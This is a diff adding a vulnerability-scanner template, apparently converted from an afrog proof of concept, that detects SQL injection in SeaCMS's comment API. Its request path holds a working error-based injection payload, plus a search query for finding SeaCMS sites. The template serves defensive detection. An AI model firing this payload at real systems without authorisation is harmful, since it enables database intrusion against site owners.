@@ -1,0 +1,28 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - 6f7c6dcbc380aac3bcba1f9fccec99
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20{{md5(202072102)}}))),@`%27`'
+id: seacms-sqli
+info:
+  author: MaxSecurity
+  description: |
+    SeaCMS sqli
+    fofa: title=="Seacms"
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: SeaCMS sqli
+  severity: high
+  tags: seacms,sqli,argus-import
